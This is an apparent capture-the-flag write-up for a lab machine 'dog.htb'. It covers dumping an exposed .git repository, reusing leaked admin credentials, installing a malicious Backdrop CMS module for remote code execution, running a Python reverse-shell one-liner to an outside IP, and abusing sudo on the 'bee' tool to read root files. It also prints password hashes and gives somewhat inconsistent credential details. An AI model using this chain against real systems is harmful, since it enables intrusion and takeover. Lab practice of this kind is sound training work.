Port 22 and 80 open

/.git/ exposed, so download with git-dumper. 

On grepping for dog.htb I found this
```
tiffany@dog.htb
dog@dog.htb
```
Now settings.php contained creds:
```
root:BackDropJ2024DS2024
```

Soo using these creds login to the site as admin.

Go to functionality > install module > Manual install

Here use this exploit to install a malicious module enabling rce
[exploitdb](https://www.exploit-db.com/exploits/52021)

This will create a .zip which is not installable, but it creates the raw folder, so zip it into tar.gz and install it.

Now go to modules/shell/shell.php and start rce lol.

Use this for reverse shell:
```python
export RHOST="10.10.14.36";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
```
+-----+-------------------+---------------------------------------------------------+
| uid | name              | pass                                                    |
+-----+-------------------+---------------------------------------------------------+
|   0 |                   |                                                         |
|   1 | jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. |
|   2 | jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 |
|   3 | dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD |
|   5 | john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. |
|   6 | morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS |
|   7 | axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV |
|   8 | rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT |
|  10 | tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v |
+-----+-------------------+---------------------------------------------------------+
```

This is the standard MySQL table, that I found using the older root:whateverthefuck credentials.
By reading /etc/passwd, I simply will crack the password to jobert.

So I tried this, it didnt work, instead I ended up using the johncusack account with the password I currently have

Now on running sudo -l you can see that it runs `/usr/local/bin/bee`

So i poked around the help menu and arrived at this for reading `root.txt`

```bash
sudo /usr/local/bin/bee --root=/var/www/html eval 'system("cat /root/root.txt");'
```
That's it time to skedaddle :).
